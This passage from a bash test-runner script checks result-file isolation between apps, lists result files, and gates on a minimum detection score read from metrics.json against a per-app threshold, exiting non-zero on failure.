  log "  $FOREIGN_FILES"
  log "  Test isolation is broken — results are bleeding between apps."
else
  log "PASS: All iteration files belong to $APP"
  ls results/*-iteration*.yaml 2>/dev/null || true
fi

# ── result files ─────────────────────────────────────────────────────────────
echo
log "=== Results ==="
ls -la results/ 2>/dev/null || true

# ── score gate ────────────────────────────────────────────────────────────────
# Parity contract: every app has a threshold and local enforces the same gate
# CI does. Exit non-zero if exceeded so CI regressions are catchable locally.
echo
if [[ -f results/metrics.json ]]; then
  BEST_SCORE=$(python3 -c "
import json
with open('results/metrics.json') as f:
    records = json.load(f)
tested = [r for r in records if r['phase'] != 'raw-baseline']
if tested:
    print(min(r['score'] for r in tested))
else:
    print('N/A')
" 2>/dev/null || echo "N/A")
  log "$APP best score: $BEST_SCORE (threshold: $APP_SCORE_THRESHOLD)"
  if [[ "$BEST_SCORE" == "N/A" ]]; then
    log "RESULT: No scored tune iterations — treating as failure"
    exit 1
  elif (( BEST_SCORE > APP_SCORE_THRESHOLD )); then
    log "RESULT: FAIL — $APP score $BEST_SCORE exceeds threshold $APP_SCORE_THRESHOLD"
    exit 1
  elif (( BEST_SCORE == 0 )); then
    log "RESULT: PERFECT — all attacks detected, zero false positives"
  else
    log "RESULT: PASS — $APP score $BEST_SCORE within threshold $APP_SCORE_THRESHOLD"
  fi
else
  log "RESULT: No metrics.json produced — tune may have failed"
  exit 1
fi
